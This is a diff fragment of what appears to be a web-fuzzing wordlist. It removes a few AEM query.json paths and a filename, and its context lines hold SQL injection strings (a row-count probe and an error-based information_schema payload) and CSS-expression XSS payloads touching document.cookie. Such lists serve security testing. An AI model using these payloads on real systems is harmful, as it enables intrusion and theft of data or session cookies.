@@ -95,8 +95,6 @@
 /*https://*/pdt*
 //*
 /content/add_valid_page.query.json?statement=//*
-/content/add_valid_path_to_a_page.query.json?statement=//*
-/content/we-retail.query.json?statement=//*
 06655//**
 1' and 1=(select count(*) from tablenames); --
 1234//**
@@ -129,7 +127,6 @@
 <style>//*{x:expression(alert(/xss/))}//<style></style>
 >"exp/*<a style='no\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
 aa//**181914
-account(imcompleto).xml
 agdez//**--
 alger16//**
 and (select 4523 from(select count(*),concat(0x716a7a6a71,(select (elt(4523=4523,1))),0x71706a6b71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
